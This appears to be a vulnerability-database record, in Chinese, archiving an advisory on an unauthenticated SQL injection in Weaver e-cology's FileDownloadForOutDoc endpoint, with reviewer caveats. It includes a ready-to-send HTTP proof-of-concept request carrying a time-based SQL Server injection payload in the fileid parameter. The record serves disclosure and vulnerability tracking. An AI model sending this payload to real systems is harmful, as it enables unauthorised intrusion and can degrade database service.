---
source: "MrWQ/vulnerability-paper"
title: "泛微e-cology FileDownloadForOutDoc SQL注入"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "8/9补丁<10.58.0；SQL Server延迟"
prerequisites: "请求无cookie，未说明"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/8L9QdtBiEKTSFuZJHEtPNg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20OA%20FileDownloadForOutDoc%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-c90bcfae6dc6d43ea536c613"
entity_id: "ve-c90bcfae6dc6d43ea536c613"
schema_version: "1"
---

# 泛微e-cology FileDownloadForOutDoc SQL注入

## 条目说明

- 对象与具体问题：泛微e-cology；FileDownloadForOutDoc SQL注入
- 版本、配置及部署条件：8/9补丁<10.58.0；SQL Server延迟
- 认证与权限前提：请求无cookie，未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与另一FileDownloadForOutDoc报告同接口/参数/条件，差异仅fileid及延时值
- HTTP无头体空行；缺基准延迟和缓存/重复fileid前提
- 无具体CVE，不继承合集可疑CVE

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8L9QdtBiEKTSFuZJHEtPNg)

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLZKYL7bO4USVIB94mTLjt2JVANofXUyb4Dc4nswEMC6efsn0qdnR5uZaKJhGEPErZ06IL2KJvADQ/640?wx_fmt=png)

<table><tbody><tr><td width="269" valign="middle" rowspan="2" colspan="1" align="center"><p><strong>影响版本</strong><br></p></td><td width="269" valign="middle" align="center"><p>Ecology 9.x 补丁版本 &lt; 10.58.0</p></td></tr><tr><td width="269" valign="middle" align="center"><p>Ecology 8.x 补丁版本 &lt; 10.58.0</p></td></tr></tbody></table>

**【漏洞复现】**  

```http
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
fileid=2+WAITFOR+DELAY+'0:0:10'&isFromOutImg=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLZKYL7bO4USVIB94mTLjt2oaROBG6qJxy9dJcbROVcBMiaJy9vQ5IuS1AcgibD42PZBOdbk5iaUsIxA/640?wx_fmt=png)

免责声明由于传播、利用本公众号 MaLoSec 所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号 MaLoSec 及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLGoiaHMOw9kHugI1LV8V9RIX5utaFBbLQm5YazuicqGh5MKare8wXqKl58KPaKkZIwvialtJibbr6yXw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLGoiaHMOw9kHugI1LV8V9RIhXRNd6ECVRiaGPibgObCrRvPDQI2czuUcYxNmOibYHkrU0zlknrgGwZYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
